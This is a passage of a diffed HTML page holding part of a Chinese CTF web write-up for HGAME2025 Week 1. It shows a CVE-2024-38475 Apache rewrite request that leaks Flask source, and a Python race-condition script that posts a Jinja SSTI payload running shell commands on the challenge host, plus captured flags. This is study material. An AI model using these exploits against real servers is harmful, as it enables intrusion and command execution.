&#125;)</span><br><span class="line"></span><br><span class="line">	err := g.Run(<span class="string">&quot;:8080&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;Failed to start server:&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330137.png" alt="image-20250209150133237" style="zoom:50%;">
+<img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330137.png" alt="image-20250209150133237" style="zoom:50%;">
 
 <p>flag{y0u-5AId-RlGHT_But-You_5H0u1d-pI4y-gEn5hiN-IMp@CT0}</p>
 <h1 id="Level-38475-角落"><a href="#Level-38475-角落" class="headerlink" title="Level 38475 角落"></a>Level 38475 角落</h1><p>robots.txt</p>
-<img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502062137977.png" alt="image-20250206213758771" style="zoom:50%;">
+<img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502062137977.png" alt="image-20250206213758771" style="zoom:50%;">
 
 <p>app.conf</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># Include by httpd.conf</span><br><span class="line">&lt;Directory &quot;/usr/local/apache2/app&quot;&gt;</span><br><span class="line">	Options Indexes</span><br><span class="line">	AllowOverride None</span><br><span class="line">	Require all granted</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line"></span><br><span class="line">&lt;Files &quot;/usr/local/apache2/app/app.py&quot;&gt;</span><br><span class="line">    Order Allow,Deny</span><br><span class="line">    Deny from all</span><br><span class="line">&lt;/Files&gt;</span><br><span class="line"></span><br><span class="line">RewriteEngine On</span><br><span class="line">RewriteCond &quot;%&#123;HTTP_USER_AGENT&#125;&quot; &quot;^L1nk/&quot;</span><br><span class="line">RewriteRule &quot;^/admin/(.*)$&quot; &quot;/$1.html?secret=todo&quot;</span><br><span class="line"></span><br><span class="line">ProxyPass &quot;/app/&quot; &quot;http://127.0.0.1:5000/&quot;</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># Include by httpd.conf</span><br><span class="line">&lt;Directory &quot;/usr/local/apache2/app&quot;&gt;</span><br><span class="line">	Options Indexes</span><br><span class="line">	AllowOverride None</span><br><span class="line">	Require all granted</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line"></span><br><span class="line">&lt;Files &quot;/usr/local/apache2/app/app.py&quot;&gt;</span><br><span class="line">    Order Allow,Deny</span><br><span class="line">    Deny from all</span><br><span class="line">&lt;/Files&gt;</span><br><span class="line"></span><br><span class="line">RewriteEngine On</span><br><span class="line">RewriteCond &quot;%&#123;HTTP_USER_AGENT&#125;&quot; &quot;^L1nk/&quot;</span><br><span class="line">RewriteRule &quot;^/admin/(.*)$&quot; &quot;/$1.html?secret=todo&quot;</span><br><span class="line"></span><br><span class="line">ProxyPass &quot;/app/&quot; &quot;http://127.0.0.1:5000/&quot;</span><br></pre></td></tr></table></figure>
 
 <p>cve-2024-38475,构造请求获取源码</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /admin//usr/local/apache2/app/app.py%3f HTTP/1.1</span><br><span class="line">Host: node1.hgame.vidar.club:32372</span><br><span class="line">User-Agent: L1nk/</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /admin//usr/local/apache2/app/app.py%3f HTTP/1.1</span><br><span class="line">Host: node1.hgame.vidar.club:32372</span><br><span class="line">User-Agent: L1nk/</span><br></pre></td></tr></table></figure>
 
-<p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502061716289.png" alt="image-20250206171648135"></p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string, redirect</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> templates</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">pwd = os.path.dirname(__file__)</span><br><span class="line">show_msg = templates.show_msg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readmsg</span>():</span><br><span class="line">    filename = pwd + <span class="string">&quot;/tmp/message.txt&quot;</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(filename):</span><br><span class="line">        f = <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        message = f.read()</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="keyword">return</span> message</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;No message now.&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    status = request.args.get(<span class="string">&#x27;status&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> status <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        status = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, status=status)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/send&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_message</span>():</span><br><span class="line">    filename = pwd + <span class="string">&quot;/tmp/message.txt&quot;</span></span><br><span class="line">    message = request.form[<span class="string">&#x27;message&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    f = <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    f.write(message)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;index?status=Send successfully!!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_message</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> readmsg():</span><br><span class="line">        show = show_msg.replace(<span class="string">&quot;&#123;&#123;message&#125;&#125;&quot;</span>, readmsg())</span><br><span class="line">        <span class="keyword">return</span> render_template_string(show)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;waf!!&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure></div>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502061716289.png" alt="image-20250206171648135"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string, redirect</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> templates</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">pwd = os.path.dirname(__file__)</span><br><span class="line">show_msg = templates.show_msg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readmsg</span>():</span><br><span class="line">    filename = pwd + <span class="string">&quot;/tmp/message.txt&quot;</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(filename):</span><br><span class="line">        f = <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        message = f.read()</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="keyword">return</span> message</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;No message now.&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    status = request.args.get(<span class="string">&#x27;status&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> status <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        status = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, status=status)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/send&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_message</span>():</span><br><span class="line">    filename = pwd + <span class="string">&quot;/tmp/message.txt&quot;</span></span><br><span class="line">    message = request.form[<span class="string">&#x27;message&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    f = <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    f.write(message)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;index?status=Send successfully!!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_message</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> readmsg():</span><br><span class="line">        show = show_msg.replace(<span class="string">&quot;&#123;&#123;message&#125;&#125;&quot;</span>, readmsg())</span><br><span class="line">        <span class="keyword">return</span> render_template_string(show)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;waf!!&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
 
 <p><code>/read</code>路由会读取留言的内容，看到<code>render_template_string</code>就知道有SSTI，但是过滤了{，可以条件竞争</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url_send = <span class="string">&quot;http://node1.hgame.vidar.club:31844/app/send&quot;</span></span><br><span class="line">url_read = <span class="string">&quot;http://node1.hgame.vidar.club:31844/app/read&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&#123;&#123;g.pop.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;cat /f*&#x27;).read()&#125;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_payload</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">          </span><br><span class="line">            response = requests.post(url_send, data=&#123;<span class="string">&quot;message&quot;</span>: payload&#125;)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Payload sent successfully to <span class="subst">&#123;url_send&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Error sending payload: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_message</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">            response = requests.get(url_read)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Response from /read: <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Error reading message: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    send_thread = threading.Thread(target=send_payload, daemon=<span class="literal">True</span>)</span><br><span class="line">    read_thread = threading.Thread(target=read_message, daemon=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    send_thread.start()</span><br><span class="line">    read_thread.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url_send = <span class="string">&quot;http://node1.hgame.vidar.club:31844/app/send&quot;</span></span><br><span class="line">url_read = <span class="string">&quot;http://node1.hgame.vidar.club:31844/app/read&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&#123;&#123;g.pop.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;cat /f*&#x27;).read()&#125;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_payload</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">          </span><br><span class="line">            response = requests.post(url_send, data=&#123;<span class="string">&quot;message&quot;</span>: payload&#125;)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Payload sent successfully to <span class="subst">&#123;url_send&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Error sending payload: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_message</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">            response = requests.get(url_read)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Response from /read: <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Error reading message: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    send_thread = threading.Thread(target=send_payload, daemon=<span class="literal">True</span>)</span><br><span class="line">    read_thread = threading.Thread(target=read_message, daemon=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    send_thread.start()</span><br><span class="line">    read_thread.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330928.png" alt="image-20250206211914726"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330928.png" alt="image-20250206211914726"></p>
 <p>hgame{yOU-fINd-Th3-key-To_RRRac3_0uUuUt25a5219}</p>
 
-        </div>
-
-        
-            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
-                <div class="article-copyright-info-container">
-    <ul>
-        <li><strong>Title:</strong> HGAME2025 WEEK1 Web Writeup</li>
-        <li><strong>Author:</strong> p0l1st</li>
-        <li><strong>Created at
-                :</strong> 2025-02-10 13:28:16</li>
-        
-            <li>
-                <strong>Updated at
-                    :</strong> 2025-02-11 23:53:51
-            </li>
-        
-        <li>
-            <strong>Link:</strong> https://blog.p0l1st.top/2025/02/10/HGAME2025-WEEK1-Web-Writeup/
-        </li>
-        <li>
-            <strong>
-                License:
-            </strong>
-            
-
-            
-                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
-            
-        </li>
-    </ul>
-</div>
-
-            </div>
-        
-
-        
-            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
-                
-                    <li class="tag-item mx-0.5">
-                        <a href="/tags/CTF/">#CTF</a>&nbsp;
-                    </li>
-                
-            </ul>
-        
-
-        
-
-        
-            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
-                
-                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-                        <a class="prev"
-                        rel="prev"
-                        href="/2025/03/19/CTFSHOW-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
-                        >
-                            <span class="left arrow-icon flex justify-center items-center">
-                                <i class="fa-solid fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">CTFSHOW-Java反序列化</span>
-                                <span class="post-nav-item">Prev posts</span>
-                            </span>
-                        </a>
-                    </div>
-                
-                
-                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-                        <a class="next"
-                        rel="next"
-                        href="/2025/02/02/Java%E5%AE%89%E5%85%A8-Commons-Collections-7%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"
-                        >
-                            <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">Java安全-Commons-Collections 7利用链分析</span>
-                                <span class="post-nav-item">Next posts</span>
-                            </span>
-                            <span class="right arrow-icon flex justify-center items-center">
-                                <i class="fa-solid fa-chevron-right"></i>
-                            </span>
-                        </a>
-                    </div>
-                
-            </div>
-        
-
-
-        
-            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
-                <div class="comments-container mt-10 w-full ">
-    <div id="comment-anchor" class="w-full h-2.5"></div>
-    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
-        Comments
-    </div>
-    
-
-        
-            
-    <div id="waline"></div>
-    <script type="module" data-swup-reload-script>
-      import { init } from '/js/libs/waline.mjs';
-
-      function loadWaline() {
-        init({
-          el: '#waline',
-          serverURL: 'https://example.example.com',
-          lang: 'zh-CN',
-          dark: 'body[class~="dark-mode"]',
-          reaction: false,
-          requiredMeta: ['nick', 'mail'],
-          emoji: [],
-          recaptchaV3Key: "wasd",
-          
-        });
-      }
-
-      if (typeof swup !== 'undefined') {
-        loadWaline();
-      } else {
-        window.addEventListener('DOMContentLoaded', loadWaline);
-      }
-    </script>
-
-
-
-        
-    
-</div>
-
-            </div>
-        
     </div>
 
     
-        <div class="toc-content-container">
-            <div class="post-toc-wrap">
-    <div class="post-toc">
-        <div class="toc-title">On this page</div>
-        <div class="page-title">HGAME2025 WEEK1 Web Writeup</div>
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-24-Pacman"><span class="nav-text">Level 24 Pacman</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-47-BandBomb"><span class="nav-text">Level 47 BandBomb</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-69-MysteryMessageBoard"><span class="nav-text">Level 69 MysteryMessageBoard</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-25-%E5%8F%8C%E9%9D%A2%E4%BA%BA%E6%B4%BE%E5%AF%B9"><span class="nav-text">Level 25 双面人派对</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-38475-%E8%A7%92%E8%90%BD"><span class="nav-text">Level 38475 角落</span></a></li></ol>
-
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by p0l1st, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/CTF/" class="tag">#CTF</a>
+        </p>
+        
     </div>
-</div>
-        </div>
     
-</div>
 
-
-
-                
-
-            </div>
-
-            
-
-        </div>
-
-        <div class="main-content-footer">
-            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
-    <div class="info-container py-3 text-center">
+    <div class="container post-prev-next">
         
-        <div class="text-center">
-            &copy;
-            
-              <span>2024</span>
-              -
-            
-            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">p0l1st</a>
-            
-                
-                <p class="post-count space-x-0.5">
-                    <span>
-                        13 posts in total
-                    </span>
-                    
-                </p>
-            
-        </div>
-        
-            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
-            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
-                
-                    <span id="busuanzi_container_site_uv" class="lg:!block">
-                        <span class="text-sm">VISITOR COUNT</span>
-                        <span id="busuanzi_value_site_uv"></span>
-                    </span>
-                
-                
-                    <span id="busuanzi_container_site_pv" class="lg:!block">
-                        <span class="text-sm">TOTAL PAGE VIEWS</span>
-                        <span id="busuanzi_value_site_pv"></span>
-                    </span>
-                
-            </div>
-        
-        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
-            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
-            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.7.1</a></span>
-        </div>
-        
-        
+        <a href="/2025/03/19/CTFSHOW-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="next">
             <div>
-                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+                <div class="text">
+                    <p class="label">Next</p>
